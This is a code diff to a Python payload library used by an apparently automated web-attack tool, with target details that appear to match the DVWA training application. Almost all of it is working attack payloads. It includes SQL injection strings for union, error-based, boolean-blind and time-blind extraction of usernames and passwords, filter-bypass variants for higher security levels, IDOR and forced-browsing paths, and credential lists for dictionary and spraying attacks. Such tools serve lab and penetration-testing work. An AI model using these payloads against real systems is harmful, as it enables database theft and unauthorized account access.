@@ -27,8 +27,8 @@ class PayloadLibrary:
 
     _PAYLOAD_DB: dict[str, PayloadSet] = {
         "sqli_union": PayloadSet(
-            probe=["1' UNION SELECT null-- -", "1' UNION SELECT 1,2-- -"],
-            exploit=["1' UNION SELECT user(),database()-- -", "1' UNION SELECT user,password FROM users-- -"],
+            probe=["1' ORDER BY 1-- -", "1' ORDER BY 2-- -", "1' UNION SELECT null-- -"],
+            exploit=["1' UNION SELECT user,password FROM users-- -"],
             bypass={
                 "medium": ["1 UNION SELECT user,password FROM users#"],
                 "high": ["1' UNION SELECT user,password FROM users LIMIT 1-- -"],
@@ -36,66 +36,68 @@ class PayloadLibrary:
         ),
         "sqli_error": PayloadSet(
             probe=["1'", "1''", "1\""],
-            exploit=["1' AND 1=0 UNION SELECT null,version()-- -"],
+            exploit=["1' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -",
+                     "1' AND 1=0 UNION SELECT null,concat(user,0x3a,password) FROM users-- -"],
             bypass={
-                "medium": ["1 AND 1=0 UNION SELECT null,version()#"],
-                "high": ["1' AND 1=0 UNION SELECT null,version() LIMIT 1-- -"],
+                "medium": ["1 AND extractvalue(1,concat(0x7e,(SELECT database())))#"],
+                "high": ["1' AND 1=0 UNION SELECT null,concat(user,0x3a,password) FROM users LIMIT 1-- -"],
             },
         ),
         "sqli_boolean_blind": PayloadSet(
             probe=["1' AND 1=1-- -", "1' AND 1=2-- -"],
-            exploit=["1' AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a'-- -"],
+            exploit=["1' AND ASCII(SUBSTR(database(),1,1))>77-- -",
+                     "1' AND ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>77-- -"],
             bypass={
-                "medium": ["1 AND 1=1#", "1 AND 1=2#"],
-                "high": ["1'/**/AND/**/1=1-- -"],
+                "medium": ["1 AND ASCII(SUBSTR(database(),1,1))>77#"],
+                "high": ["1'/**/AND/**/ASCII(SUBSTR(database(),1,1))>77-- -"],
             },
         ),
         "sqli_time_blind": PayloadSet(
-            probe=["1' AND SLEEP(1)-- -", "1' AND pg_sleep(1)-- -"],
-            exploit=["1' AND IF(ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>77,SLEEP(3),0)-- -"],
+            probe=["1' AND SLEEP(3)-- -"],
+            exploit=["1' AND IF(ASCII(SUBSTR(database(),1,1))>77,SLEEP(3),0)-- -"],
             bypass={
                 "medium": ["1 AND SLEEP(3)#"],
                 "high": ["1'/**/AND/**/SLEEP(3)-- -"],
             },
         ),
         "ac_idor": PayloadSet(
-            probe=["id=1", "id=2", "id=3"],
-            exploit=["id=4", "id=5", "id=6"],
+            probe=["1", "2", "3"],
+            exploit=["4", "5", "6"],
             bypass={
-                "medium": ["id=7", "id=8", "id=9"],
-                "high": ["id=100", "id=200", "id=300"],
+                "medium": ["7", "8"],
+                "high": ["100", "200"],
             },
         ),
         "ac_vertical_escalation": PayloadSet(
-            probe=["role=user", "role=admin"],
-            exploit=["role=admin&user_id=1", "elevate=1"],
+            probe=["1", "2"],
+            exploit=["1", "1"],
             bypass={
-                "medium": ["role=admin%00user"],
-                "high": ["x-role: admin"],
+                "medium": ["1"],
+                "high": ["1"],
             },
         ),
         "ac_force_browse": PayloadSet(
-            probe=["/admin", "/config", "/backup"],
-            exploit=["/admin/config.php", "/.env"],
+            probe=["setup.php", "phpinfo.php"],
+            exploit=["vulnerabilities/view_source.php", "security.php"],
             bypass={
-                "medium": ["/admin%2fconfig.php"],
-                "high": ["/admin/./config.php"],
+                "medium": ["setup.php"],
+                "high": ["setup.php"],
             },
         ),
         "bf_dictionary": PayloadSet(
             probe=["admin:password", "admin:admin"],
-            exploit=["gordonb:abc123", "pablo:letmein", "admin:password"],
+            exploit=["admin:password", "gordonb:abc123", "pablo:letmein", "smithy:password"],
             bypass={
-                "medium": ["admin:password:delay=500ms"],
-                "high": ["admin:password:captcha=bypass"],
+                "medium": ["admin:password"],
+                "high": ["admin:password"],
             },
         ),
         "bf_spray": PayloadSet(
-            probe=["admin:password", "user:password"],
-            exploit=["admin:password", "user:password", "test:test"],
+            probe=["admin:password", "1337:charley"],
+            exploit=["admin:password", "gordonb:abc123", "pablo:letmein", "1337:charley"],
             bypass={
-                "medium": ["admin:password:delay=500ms"],
-                "high": ["admin:password:captcha=bypass"],
+                "medium": ["admin:password"],
+                "high": ["admin:password"],
             },
         ),
     }
